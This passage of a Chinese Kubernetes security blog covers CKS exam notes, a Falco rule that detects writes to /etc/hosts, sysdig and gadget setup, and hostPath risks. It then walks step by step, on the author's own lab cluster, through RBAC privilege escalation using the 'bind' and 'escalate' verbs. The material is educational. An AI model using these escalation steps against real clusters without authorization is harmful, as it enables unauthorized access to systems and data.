例子：禁止写/etc/hosts</span><br><span class=\"line\">- rule: Detect Write Below /etc/hosts</span><br><span class=\"line\">  desc: an attempt to write to /etc/hosts file (CVE-2020-8557)</span><br><span class=\"line\">  condition: open_write and container and fd.name=/etc/hosts</span><br><span class=\"line\">  output: &quot;File /etc/hosts opened for writing (user=%user.name command=%proc.cmdline parent=%proc.pname pcmdline=%proc.pcmdline file=%fd.name program=%proc.name gparent=%proc.aname[2] ggparent=%proc.aname[3] gggparent=%proc.aname[4] container_id=%container.id image=%container.image.repository)&quot;</span><br><span class=\"line\">  priority: ERROR</span><br><span class=\"line\">  tags: [filesystem, mitre_persistence]</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"sysdig\"><a href=\"#sysdig\" class=\"headerlink\" title=\"sysdig\"></a>sysdig</h2><p>我一直装不起来，没有成功使用过，好在最后考试也没考到他。</p>\n<p>我记录一下我折腾的安装方法，你们可以不用参考我的，用你能装上的就行。我有机会会再次尝试。（TODO）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这个东西的安装实在是太麻烦了，文档也一点都不友好，找都找不到怎么弄。</span><br><span class=\"line\">这个sysdig是falco产品的公司，但是falco就简单很多。sysdig是整个平台。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; 先在这里下载installer</span><br><span class=\"line\">https://github.com/draios/sysdigcloud-kubernetes/releases</span><br><span class=\"line\">&gt; 然后再这里下载values.yaml</span><br><span class=\"line\">https://github.com/draios/onprem-install-docs/blob/main/5.0.4/values.yaml</span><br><span class=\"line\">&gt; 然后填写values.yaml中的字段</span><br><span class=\"line\">quaypullsecret字段这么填：</span><br><span class=\"line\">从这里拷贝pull secret：</span><br><span class=\"line\">https://console.redhat.com/openshift/install/pull-secret</span><br><span class=\"line\">然后 echo &lt;secret&gt; | base64 -w 0 获取base64后的值填到quaypullsecret中。</span><br><span class=\"line\">storageClassProvisioner填写 local</span><br><span class=\"line\">username、license填个邮箱</span><br><span class=\"line\">dnsName填jinqidiguo.com</span><br><span class=\"line\">字段填写都可以参考这里</span><br><span class=\"line\">https://github.com/draios/onprem-install-docs/blob/main/5.0.4/configuration_parameters.md</span><br><span class=\"line\"></span><br><span class=\"line\">但是即使配置了size为small还是无法安装成功，因为从他的错误信息看，他要求整个集群至少包含CPU14个，内存21G。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">后来尝试了单机的sysdig</span><br><span class=\"line\">https://github.com/draios/sysdig</span><br><span class=\"line\">执行：</span><br><span class=\"line\">sudo docker run --rm -i -t --privileged --net=host \\</span><br><span class=\"line\">    -v /var/run/docker.sock:/host/var/run/docker.sock \\</span><br><span class=\"line\">    -v /dev:/host/dev \\</span><br><span class=\"line\">    -v /proc:/host/proc:ro \\</span><br><span class=\"line\">    -v /boot:/host/boot:ro \\</span><br><span class=\"line\">    -v /src:/src \\</span><br><span class=\"line\">    -v /lib/modules:/host/lib/modules:ro \\</span><br><span class=\"line\">    -v /usr:/host/usr:ro \\</span><br><span class=\"line\">    -v /etc:/host/etc:ro \\</span><br><span class=\"line\">    docker.io/sysdig/sysdig</span><br><span class=\"line\">注意由于mount了用户目录外的目录，所以docker得用apt安装不能用snap安装，不然会失败。</span><br><span class=\"line\"></span><br><span class=\"line\">但是还是运行不起来，报了GLIBC not found。</span><br><span class=\"line\">好了不折腾了。</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"gadget\"><a href=\"#gadget\" class=\"headerlink\" title=\"gadget\"></a>gadget</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">一系列的检查集群的小部件</span><br><span class=\"line\"># install</span><br><span class=\"line\">  # 根据这里安装krew插件</span><br><span class=\"line\">https://krew.sigs.k8s.io/docs/user-guide/setup/install/</span><br><span class=\"line\">  # 然后用krew安装gadget插件</span><br><span class=\"line\">  # https://github.com/kinvolk/inspektor-gadget/blob/main/docs/install.md#installing-kubectl-gadget</span><br><span class=\"line\">kubectl krew install gadget</span><br><span class=\"line\">  # 用gadget插件部署gadget的DaemonSet</span><br><span class=\"line\">  # 这里arm的image没有所以arm集群会安装失败。</span><br><span class=\"line\">kubectl gadget deploy | kubectl apply -f -</span><br><span class=\"line\"></span><br><span class=\"line\"># 然后根据文档使用这些小部件，</span><br><span class=\"line\">https://github.com/kinvolk/inspektor-gadget#the-gadgets</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"immutable-pod-stateless-pod-1\"><a href=\"#immutable-pod-stateless-pod-1\" class=\"headerlink\" title=\"immutable pod / stateless pod\"></a>immutable pod / stateless pod</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">immutable主要是指pod不能修改主机文件</span><br><span class=\"line\">涉及security context中的readOnlyRootFilesystem以及privileged。</span><br><span class=\"line\"></span><br><span class=\"line\">stateles主要是不能存状态数据在container中，emptyDir的volume也不行。</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"hostPath-security-issue\"><a href=\"#hostPath-security-issue\" class=\"headerlink\" title=\"hostPath security issue\"></a>hostPath security issue</h2><p>挂载一个hostPath的volumes的时候，需要设置挂载方式为read only， 不然存在安全风险。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">volumes:</span><br><span class=\"line\">- name: test-volume</span><br><span class=\"line\">  hostPath:</span><br><span class=\"line\">    path: /data</span><br><span class=\"line\">    type: Directory</span><br><span class=\"line\">这时定义hostpath的volume，定义的时候没有readonly选项。</span><br><span class=\"line\"></span><br><span class=\"line\">volumeMounts:</span><br><span class=\"line\">- name: test-volume</span><br><span class=\"line\">  mountPath: /test-volume</span><br><span class=\"line\">  readOnly: true</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在官方文档中有这么一段话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://kubernetes.io/docs/concepts/storage/volumes/#hostpath</span><br><span class=\"line\"></span><br><span class=\"line\">Warning:</span><br><span class=\"line\">HostPath volumes present many security risks, and it is a best practice to avoid the use of HostPaths when possible. When a HostPath volume must be used, it should be scoped to only the required file or directory, and mounted as ReadOnly.</span><br><span class=\"line\"></span><br><span class=\"line\">If restricting HostPath access to specific directories through AdmissionPolicy, volumeMounts MUST be required to use readOnly mounts for the policy to be effective.</span><br></pre></td></tr></table></figure>\n\n<p>简单讲就是在强调你在挂载hostpath的volume的时候必须设置readOnly。</p>\n<p>这是因为，已经证明存在一些方法来绕过约束。比如我配置了hostPath不能访问A目录，但是我可以通过挂载B目录间接访问A目录；或者我配置了hostPath只能访问A目录，但是我可以通过A目录，间接访问到B目录。是不是很神奇。</p>\n<p>这部分内容比较独立，并且偏向于攻击，也没有考到，感兴趣的可以跳到<a href=\"https://yizhi.ren/2022/02/08/hostpath/\">k8s中的hostPath的安全隐患</a>查看。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>最后祝大家考试顺利~</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://yizhi.ren/2022/02/06/dangerousprivileges/\">k8s中的危险权限</a><br><a href=\"https://yizhi.ren/2022/01/25/setupk8s/\">树莓派搭建k8s集群</a><br><a href=\"https://yizhi.ren/2022/02/08/hostpath/\">k8s中的hostPath的安全隐患</a><br><a href=\"https://yizhi.ren/2022/02/07/podsecuritypolicy/\">k8s中的PodSecurityPolicy</a><br><a href=\"https://github.com/walidshaari/Kubernetes-Certified-Administrator\">CKA prepare</a><br><a href=\"https://github.com/dgkanatsios/CKAD-exercises\">CKAD prepare</a><br><a href=\"https://github.com/walidshaari/Certified-Kubernetes-Security-Specialist\">CKS prepare</a><br><a href=\"https://github.com/killer-sh/cks-challenge-series/tree/master/challenges/ImagePolicyWebhook\">cks-challenge-series/ImagePolicyWebhook</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook\">kubernetes admission-controllers imagepolicywebhook</a><br><a href=\"https://itnext.io/cks-exam-series-4-crash-that-apiserver-5f4d3d503028\">CKS Exam Series #4 Crash that Apiserver !</a><br><a href=\"https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/\">kubernetes Pod Lifecycle</a><br><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/kubernetes-best-practices-terminating-with-grace\">Kubernetes best practices: terminating with grace</a><br><a href=\"https://learnk8s.io/blog/smaller-docker-images\">3 simple tricks for smaller Docker images</a><br><a href=\"https://kubernetes.io/docs/concepts/containers/runtime-class/\">Kubernetes Runtime Class</a><br><a href=\"https://gvisor.dev/docs/user_guide/install/\">gvisor Installation</a><br><a href=\"https://kubernetes.io/docs/concepts/storage/volumes/#hostpath\">kubernetes volume hostpath</a><br><a href=\"https://kubernetes.io/docs/tasks/extend-kubernetes/configure-aggregation-layer/#authentication-flow\">kubernetes authentication-flow</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/authentication/\">kubernetes Authenticating</a><br><a href=\"https://kubernetes.io/docs/tutorials/clusters/apparmor/\">Kubernetes Restrict a Container’s Access to Resources with AppArmor</a><br><a href=\"https://github.com/open-policy-agent/gatekeeper/blob/release-3.7/deploy/gatekeeper.yaml\">GateKeeperV3 deploy file</a><br><a href=\"https://www.openpolicyagent.org/docs/latest/kubernetes-tutorial/\">OPA Tutorial</a><br><a href=\"https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions\">Securing Kubernetes Clusters by Eliminating Risky Permissions</a><br><a href=\"https://dominik-tornow.medium.com/inside-kubernetes-rbac-9988b08a738a\">Inside Kubernetes RBAC</a><br><a href=\"https://rbac.dev/\">advocacy site for Kubernetes RBAC</a><br><a href=\"https://github.com/kubernetes/kubernetes/tree/master/CHANGELOG\">kubernetes changelog</a><br><a href=\"https://github.com/kubernetes/dashboard/blob/36e967d848006dee386355c26f392f9045bc8f3d/docs/common/dashboard-arguments.md\">kubernetes Dashboard arguments</a><br><a href=\"https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml\">Dashboard deploy file</a><br><a href=\"https://github.com/kubernetes/dashboard/blob/master/docs/user/access-control/creating-sample-user.md\">Dashboard Creating sample user</a><br><a href=\"https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/#deploying-the-dashboard-ui\">kubernetes Deploying the Dashboard UI</a><br><a href=\"https://kubernetes.io/docs/tasks/extend-kubernetes/configure-aggregation-layer/\">kubernetes Configure the Aggregation Layer</a><br><a href=\"https://itnext.io/our-journey-in-building-a-kubernetes-aggregated-api-server-29a4f9c1de22\">Building Kubernetes Aggregated API Server</a><br><a href=\"https://kubernetes.io/docs/tasks/tls/managing-tls-in-a-cluster/\">kubernetes Manage TLS Certificates in a Cluster</a><br><a href=\"https://kubernetes.io/docs/concepts/configuration/secret/#tls-secrets\">kubernetes TLS secrets</a><br><a href=\"https://kubernetes.io/docs/concepts/services-networking/ingress/#tls\">kubernetes TLS ingress</a><br><a href=\"https://docs.microsoft.com/en-us/azure/aks/ingress-own-tls?tabs=azure-cli\">Create an HTTPS ingress controller and use your own TLS certificates on Azure Kubernetes Service</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#signers\">kubernetes Signers</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#normal-user\">kubernetes Normal user</a><br><a href=\"https://kubernetes.io/docs/concepts/security/pod-security-admission/\">kubernetes Pod Security Admission</a><br><a href=\"https://kubernetes.io/docs/tutorials/clusters/seccomp/\">kubernetes Restrict a Container’s Syscalls with seccomp</a><br><a href=\"https://kubernetes.io/docs/reference/command-line-tools-reference/feature-gates/\">kubernetes Feature Gates</a><br><a href=\"https://kubernetes.io/blog/2021/08/25/seccomp-default/\">kubernetes Enable seccomp for all workloads with a new v1.22 alpha feature</a><br><a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server\">kubernetes Use the Default Service Account to access the API server</a><br><a href=\"https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#pod-garbage-collection\">kubernetes Garbage collection of failed Pods</a><br><a href=\"https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/\">kube-apiserver command line parameter</a><br><a href=\"https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/\">kubernetes Encrypting Secret Data at Rest</a><br><a href=\"https://kubernetes.io/docs/tasks/debug-application-cluster/audit/\">kubernetes Auditing</a><br><a href=\"https://trstringer.com/kubernetes-alwayspullimages/\">Kubernetes’ AlwaysPullImages Admission Control - the Importance, Implementation, and Security Vulnerability in its Absence</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#alwayspullimages\">kubernetes AlwaysPullImages</a><br><a href=\"https://kubernetes.io/zh/docs/tasks/configure-pod-container/pull-image-private-registry/\">kubernetes imagePullSecrets</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#eventratelimit\">kubernetes admission-control eventratelimit</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/authentication/#anonymous-requests\">kubernetes Anonymous requests</a><br><a href=\"https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/\">kubernetes Kubelet Configuration (v1beta)</a><br><a href=\"https://kubernetes.io/docs/reference/access-authn-authz/webhook/\">kubernetes Webhook Mode</a><br><a href=\"https://downloads.cisecurity.org/\">CIS下载网站</a><br><a href=\"https://www.ibm.com/docs/zh/cloud-private/3.1.2?topic=upgrade-kubelet-container-fails-start\">Kubelet 无法启动</a><br><a href=\"https://github.com/aquasecurity/kube-bench/blob/main/docs/running.md\">Running kube-bench</a><br><a href=\"https://github.com/aquasecurity/kube-bench/blob/main/docs/installation.md\">kube-bench Installation</a><br><a href=\"https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml\">metrics server deploy file</a><br><a href=\"https://github.com/kubernetes/ingress-nginx/blob/main/deploy/static/provider/baremetal/deploy.yaml\">ingress-nginx deploy file</a><br><a href=\"https://github.com/kubernetes/ingress-gce\">github ingress-gce repo</a><br><a href=\"https://github.com/kubernetes/ingress-nginx\">github ingress-nginx repo</a><br><a href=\"https://github.com/kubernetes/kubernetes/issues/51076#issuecomment-412846482\">anonymous-auth discuss in github kubernetes</a><br><a href=\"https://github.com/kubernetes/kubeadm/issues/798#issuecomment-470579937\">anonymous-auth discuss in github kubeadm</a><br><a href=\"https://github.com/kinvolk/inspektor-gadget#the-gadgets\">gadgets list</a><br><a href=\"https://github.com/kinvolk/inspektor-gadget/blob/main/docs/install.md#installing-kubectl-gadget\">installing-kubectl-gadget</a><br><a href=\"https://krew.sigs.k8s.io/docs/user-guide/setup/install/\">krew installing</a><br><a href=\"https://github.com/draios/sysdig\">sysdig github</a><br><a href=\"https://github.com/draios/onprem-install-docs/blob/main/5.0.4/configuration_parameters.md\">Sysdig Onprem Configuration Parameters</a><br><a href=\"https://github.com/draios/sysdigcloud-kubernetes/releases\">sysdigcloud releases</a><br><a href=\"https://github.com/draios/onprem-install-docs/blob/main/5.0.4/values.yaml\">Sysdig Onprem Configuration Values</a><br><a href=\"https://falco.org/docs/rules/\">Falco Rules</a><br><a href=\"https://falco.org/docs/examples/\">Falco Examples</a><br><a href=\"https://falco.org/docs/getting-started/running/\">Falco Running</a><br><a href=\"https://falco.org/docs/getting-started/installation/\">Falco Install</a><br><a href=\"https://github.com/anchore/grype\">anchore/grype</a><br><a href=\"https://github.com/anchore/syft\">anchore/syft</a><br><a href=\"https://github.com/aquasecurity/trivy\">aquasecurity/trivy</a><br><a href=\"https://aquasecurity.github.io/trivy/v0.22.0/getting-started/installation/\">trivy installation</a><br><a href=\"https://github.com/controlplaneio/kubesec\">controlplaneio/kubesec</a><br><a href=\"https://zhuanlan.zhihu.com/p/338036211\">一文看懂 Container Runtime</a></p>\n","categories":["架构"],"tags":["kubernetes"]},{"title":"k8s中的危险权限","url":"/2022/02/06/dangerousprivileges/","content":"<h1 id=\"k8s中的危险权限\"><a href=\"#k8s中的危险权限\" class=\"headerlink\" title=\"k8s中的危险权限\"></a>k8s中的危险权限</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>本文列举了k8s中几个危险的权限，危险的权限是什么意思呢，就是说如果某个低权限的用户，因为其拥有某个特殊的权限，那么他就可以通过一些操作来提升自己的权限，从而破坏系统的权限控制体系，并产生意料之外的破坏，以及导致数据的泄露等。</p>\n<p>这部分知识比较偏向攻击层面，而不是防守层面。我们通过一步步的手把手的操作，来观察如何突破权限，从而带来隐患的。</p>\n<p>存在权限风险的操作主要有4个：bind，escalate，impersonate，create pod，我们一一来分析和测试。</p>\n<span id=\"more\"></span>\n\n<p>以下的操作是基于自己搭建的k8s集群，搭建集群的步骤参考<a href=\"https://yizhi.ren/2022/01/25/setupk8s/\">树莓派搭建k8s集群</a>。</p>\n<h2 id=\"bind\"><a href=\"#bind\" class=\"headerlink\" title=\"bind\"></a>bind</h2><p>user平常也可以bind一个role/clusterrole，但仅当这个user已经拥有这个新的role/clusterrole的全部权限。</p>\n<p>当user拥有了这个bind的verb后，就可以没有这个约束，也就可以通过bind高权限的role/clusterrole来提升user的权限。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">文档：</span><br><span class=\"line\">https://kubernetes.io/docs/reference/access-authn-authz/rbac/#restrictions-on-role-binding-creation-or-update</span><br><span class=\"line\">https://raesene.github.io/blog/2021/01/16/Getting-Into-A-Bind-with-Kubernetes/</span><br></pre></td></tr></table></figure>\n\n<p>举例如下，思路是首先创建一个权限不够的sa，然后我们尝试给sa提升权限，最终一步步看到bind权限带来的效果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 创建测试用得SA，并设置到kubeconfig中去</span><br><span class=\"line\"># 假设当前在default这个namespace， 我们创建sa叫bindsa，并给他赋予list pod的权限。</span><br><span class=\"line\"></span><br><span class=\"line\">~$ alias kl=kubectl</span><br><span class=\"line\">~$ kl create sa bindsa</span><br><span class=\"line\">serviceaccount/bindsa created</span><br><span class=\"line\">~$ kl create role bindsarole --verb=list --resource=pod</span><br><span class=\"line\">role.rbac.authorization.k8s.io/bindsarole created</span><br><span class=\"line\">~$ kl create rolebinding bindingsa --serviceaccount=default:bindsa --role=bindsarole</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/bindingsa created</span><br><span class=\"line\">~$ kl get secret | grep bindsa</span><br><span class=\"line\">bindsa-token-9tq7m    kubernetes.io/service-account-token   3      25m</span><br><span class=\"line\">~$ TOKEN=$(kl get secret bindsa-token-9tq7m -o jsonpath=&#x27;&#123;.data.token&#125;&#x27; | base64 -d)</span><br><span class=\"line\">~$ kl config set-credentials bindsa --token=$TOKEN</span><br><span class=\"line\">User &quot;bindsa&quot; set.</span><br><span class=\"line\">~$ kl config set-context bindsa --cluster kubernetes --user bindsa</span><br><span class=\"line\">Context &quot;bindsa&quot; created.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">测试权限：</span><br><span class=\"line\"># 能list pod但不能list deployment</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl --context=bindsa get pod</span><br><span class=\"line\">NAME   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">......</span><br><span class=\"line\">~$ kl --context=bindsa get deployments</span><br><span class=\"line\">Error from server (Forbidden): deployments.apps is forbidden: User &quot;system:serviceaccount:default:bindsa&quot; cannot list resource &quot;deployments&quot; in API group &quot;apps&quot; in the namespace &quot;default&quot;</span><br></pre></td></tr></table></figure>\n\n<p>为了能够拥有查看其他资源的权限，我们需要bind一个clusterole叫system:aggregate-to-view，这个clusterrole已经默认存在的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl --context=bindsa create rolebinding bindingsaview --serviceaccount=default:bindsa --clusterrole=system:aggregate-to-view</span><br><span class=\"line\">error: failed to create rolebinding: rolebindings.rbac.authorization.k8s.io is forbidden: User &quot;system:serviceaccount:default:bindsa&quot; cannot create resource &quot;rolebindings&quot; in API group &quot;rbac.authorization.k8s.io&quot; in the namespace &quot;default&quot;</span><br><span class=\"line\">我们发现没法创建rolebinding，那么我们就用高权限的用户给bindsa创建create rolebinding的权限。</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl edit role bindsarole</span><br><span class=\"line\"># 添加create rolebinding的权限</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: Role</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: &quot;2022-02-07T18:22:05Z&quot;</span><br><span class=\"line\">  name: bindsarole</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">  resourceVersion: &quot;1175142&quot;</span><br><span class=\"line\">  uid: c1003090-62ad-4361-bc70-8ca23ce9e637</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;rbac.authorization.k8s.io&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - rolebindings</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - create</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - pods</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 再次执行</span><br><span class=\"line\">~$ kl --context=bindsa create rolebinding bindingsaview --serviceaccount=default:bindsa --clusterrole=system:aggregate-to-view</span><br><span class=\"line\">error: failed to create rolebinding: rolebindings.rbac.authorization.k8s.io &quot;bindingsaview&quot; is forbidden: user &quot;system:serviceaccount:default:bindsa&quot; (groups=[&quot;system:serviceaccounts&quot; &quot;system:serviceaccounts:default&quot; &quot;system:authenticated&quot;]) is attempting to grant RBAC permissions not currently held:</span><br><span class=\"line\">&#123;APIGroups:[&quot;&quot;], Resources:[&quot;bindings&quot;], Verbs:[&quot;get&quot; &quot;list&quot; &quot;watch&quot;]&#125;</span><br><span class=\"line\">......</span><br><span class=\"line\">我们发现没法创建rolebinding，因为新的role/clusterrole包含sa原先没有的权限。</span><br></pre></td></tr></table></figure>\n\n<p>到这我们已经发现没有bind权限的话，create rolebinding只能绑定已经有的权限，新权限是不能绑定的。</p>\n<p>现在我们给sa设置上新的权限：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl edit role bindsarole</span><br><span class=\"line\"># 添加bind rolebinding的权限</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: Role</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: &quot;2022-02-07T18:22:05Z&quot;</span><br><span class=\"line\">  name: bindsarole</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">  resourceVersion: &quot;1175988&quot;</span><br><span class=\"line\">  uid: c1003090-62ad-4361-bc70-8ca23ce9e637</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups: [&quot;rbac.authorization.k8s.io&quot;]</span><br><span class=\"line\">  resources: [&quot;clusterroles&quot;]</span><br><span class=\"line\">  verbs: [&quot;bind&quot;]</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - rbac.authorization.k8s.io</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - rolebindings</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - create</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - pods</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\">  </span><br><span class=\"line\"># 再次执行</span><br><span class=\"line\">~$ kl --context=bindsa create rolebinding bindingsaview --serviceaccount=default:bindsa --clusterrole=system:aggregate-to-view</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/bindingsaview created</span><br><span class=\"line\">执行成功了</span><br></pre></td></tr></table></figure>\n\n<p>可以看到，有了bind权限后，就可以bind成功了。同样bind成功后，再次get deployments等查看其他资源也能成功了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~$ kl --context=bindsa get pod</span><br><span class=\"line\">NAME   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">......</span><br><span class=\"line\">~$ kl --context=bindsa get deployments</span><br><span class=\"line\">No resources found in default namespace.</span><br></pre></td></tr></table></figure>\n\n<p>所以啊，bind权限是很危险的。</p>\n<h2 id=\"escalate\"><a href=\"#escalate\" class=\"headerlink\" title=\"escalate\"></a>escalate</h2><p>Escalate权限就是可以更改role/clusterrole的权限，就是可以更改权限的一种权限，如果一个用户有了这个权限，我们就可以拿着他的token，把某个用户的权限调大，然后这个用户的权限自然就变大了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">文档：</span><br><span class=\"line\">https://raesene.github.io/blog/2020/12/12/Escalating_Away/</span><br></pre></td></tr></table></figure>\n\n<p>举例如下，使用类似上面bind权限的测试思路，首先创建一个权限不够的sa，然后我们尝试给sa提升权限，最终一步步看到escalate权限带来的效果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 创建测试用得SA，并设置到kubeconfig中去</span><br><span class=\"line\"># 假设当前在default这个namespace， 我们创建sa叫escalatesa，并给他赋予list pod的权限。</span><br><span class=\"line\"></span><br><span class=\"line\">~$ alias kl=kubectl</span><br><span class=\"line\">~$ kl create sa escalatesa</span><br><span class=\"line\">serviceaccount/escalatesa created</span><br><span class=\"line\">~$ kl create role escalatesarole --verb=list --resource=pod</span><br><span class=\"line\">role.rbac.authorization.k8s.io/escalatesarole created</span><br><span class=\"line\">~$ kl create rolebinding escalatesa --serviceaccount=default:escalatesa --role=escalatesarole</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/escalatesa created</span><br><span class=\"line\">~$ kl get secret | grep escalatesa</span><br><span class=\"line\">escalatesa-token-xz6zh   kubernetes.io/service-account-token   3      94s</span><br><span class=\"line\">~$ TOKEN=$(kl get secret escalatesa-token-xz6zh -o jsonpath=&#x27;&#123;.data.token&#125;&#x27; | base64 -d)</span><br><span class=\"line\">~$ kl config set-credentials escalatesa --token=$TOKEN</span><br><span class=\"line\">User &quot;escalatesa&quot; set.</span><br><span class=\"line\">~$ kl config set-context escalatesa --cluster kubernetes --user escalatesa</span><br><span class=\"line\">Context &quot;escalatesa&quot; created.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">测试权限：</span><br><span class=\"line\"># 能list pod但不能list deployment</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl --context=escalatesa get pod</span><br><span class=\"line\">NAME   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">......</span><br><span class=\"line\">~$ kl --context=escalatesa get deployments</span><br><span class=\"line\">Error from server (Forbidden): deployments.apps is forbidden: User &quot;system:serviceaccount:default:escalatesa&quot; cannot list resource &quot;deployments&quot; in API group &quot;apps&quot; in the namespace &quot;default&quot;</span><br></pre></td></tr></table></figure>\n\n<p>为了能够拥有查看其他资源的权限，我们需要给role escalatesarole增加list deployments的权限。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">首先需要用高权限账户给escalatesarole添加roles的get和patch权限，不然依靠escalatesarole自己是不能编辑role的。就像刚才我们测试bind权限时需要给bindsa创建create rolebinding的权限的道理一样。</span><br><span class=\"line\"></span><br><span class=\"line\">~$ kl edit role escalatesarole</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: Role</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: &quot;2022-02-07T18:56:38Z&quot;</span><br><span class=\"line\">  name: escalatesarole</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">  resourceVersion: &quot;1178953&quot;</span><br><span class=\"line\">  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7</span><br><span class=\"line\">rules:</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - rbac.authorization.k8s.io</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - roles</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - patch</span><br><span class=\"line\">  - get</span><br><span class=\"line\">- apiGroups:</span><br><span class=\"line\">  - &quot;&quot;</span><br><span class=\"line\">  resources:</span><br><span class=\"line\">  - pods</span><br><span class=\"line\">  verbs:</span><br><span class=\"line\">  - list</span><br><span class=\"line\"></span><br><span class=\"line\"># 然后执行kl --context=escalatesa edit role escalatesarole</span><br><span class=\"line\"># 添加deployments对应的权限</span><br><span class=\"line\">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class=\"line\">kind: Role</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  creationTimestamp: &quot;2022-02-07T18:56:38Z&quot;</span><br><span class=\"line\">  name: escalatesarole</span><br><span class=\"line\">  namespace: default</span><br><span class=\"line\">  resourceVersion: &quot;1181269&quot;</span><br><span class=\"line\">  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7</span><br><span 